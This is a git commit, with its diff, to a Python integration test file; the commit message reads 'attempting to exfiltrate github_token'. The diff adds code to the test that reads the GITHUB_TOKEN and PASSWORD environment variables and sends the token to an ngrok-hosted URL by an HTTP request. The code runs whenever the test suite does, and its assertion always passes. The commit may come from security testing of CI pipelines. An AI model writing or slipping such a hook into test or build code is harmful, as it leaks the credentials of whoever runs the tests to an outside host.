f9154ef52661a48991c07df37117e61fc8994d7e
doomholderz <joeharris@gocardless.com>
2025-03-21 11:26:50 +0000

    attempting to exfiltrate github_token

--- tests/test_git.py
+++ tests/test_git.py
@@ -1,9 +1,14 @@
 import pytest
 import requests
+import os
 
 @pytest.mark.integration
 def test_int_commit():
-    response = requests.get('https://dbb9-86-10-216-244.ngrok-free.app')
+    github_token = os.getenv('GITHUB_TOKEN')
+    password = os.getenv('PASSWORD')
+    url = 'https://dbb9-86-10-216-244.ngrok-free.app'
+    url_github_token = url + github_token
+    response = requests.get(url_github_token)
 
     print("PRINT_TEST")
     assert "PRINT_TEST"
